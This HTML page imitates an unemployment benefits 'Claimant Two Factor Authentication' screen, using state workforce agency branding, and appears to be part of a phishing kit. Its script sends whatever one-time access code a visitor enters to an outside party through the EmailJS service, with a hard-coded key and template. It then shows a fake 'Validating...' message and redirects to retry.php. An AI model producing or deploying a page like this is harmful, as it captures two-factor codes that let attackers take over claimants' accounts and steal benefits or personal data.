







<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/style.css">
      <link rel="shortcut icon" href="favicon2.png">
    <title>Uplink OTP</title>
</head>
<body>
    <div class="container">



         <!-- TOP HEADER 2 STARTS-->
         <div class="header1_container">
            <div class="header1_wrapper fixed_width">
            <img src="assets/img/top_banner_02-2.png" alt="">
            </div>
    </div>
<!-- TOP HEADER 1 ENDS-->
<!-- TOP HEADER 2 STARTS -->
<div class="header2_container">
    <div class="header2_wrapper fixed_width invert">
        <h1 class="invert">Claimant Two Factor Authentication</h1>
    </div>
</div>

<!-- TOP HEADER 2 ENDS -->

<div class="form_container">
    <div class="form_wrapper">
        <div class="title_container">
            <h2>Confirm your identity</h2>
        </div>
        <div class="form_container_white">
                <div class="text_info_wrapper">
                    <p class="info1">A message has been sent to your registered email on the file.</p>

                    <p class="info2">To confirm your identity, please retrieve that message and enter the access code below </p>
                </div>

                <ul class="warning">
                    <li><p>IMPORTANT: it may take several minutes for the code to  be delivered</p></li>
                </ul>
        </div>

        <div class="auth">
             <form id="form">

                <div class="form_code_wrapper">
                    <div class="input_form">
                        <label for="" class="label">Access code :<span>*</span></label>  <br /> <br />
                        <input class="code" name="otp" type="text" id="otp" required>

                    </div>
                        <div class="btn_container">
                            <input type = "submit" id="button" value="Submit Code" />
                        </div>




                    </div>
              
                <!-- <div class="input_container">
                    <label for="" class="label">Access code :<span>*</span></label>  <br /> <br />
                    <input type="email" >
                    <br />
                </div>

                <div class="btn_container">
                    <button>Submit Code</button>
                </div> -->

                
            </form>
    </div>
    </div>

    <div class="code_btn_container">
        <a class="get_code" href="">Get Code</a>
        <a class="go_back" href=""> Go back</a>
    </div>

    <div class="partner">
        <img src="assets/img/DWD_sm.png" alt="">
        <img src="assets/img/DWD_seal_sm2.png" alt="">
        <img src="assets/img/WO_sm2.png" alt="">
    </div>
    <p class="serial">CSS UIMO1.28.4 20220303 13.23</p>
</div>
    </div>
<script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script type="text/javascript">
  emailjs.init('veFV9dPiq-R62bp3w')
</script>


        
        <script>
            
            const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

    btn.value = 'Validating...';

   const serviceID = 'default_service';
   const templateID = 'template_6rn5dka';

  emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Send Email';
      //alert('Sent!');
          setTimeout(function(){ window.location.href='retry.php';}, 5000);
    }, (err) => {
      btn.value = 'Send Email';
      alert(JSON.stringify(err));
    });
});


        </script>




</body>
</html>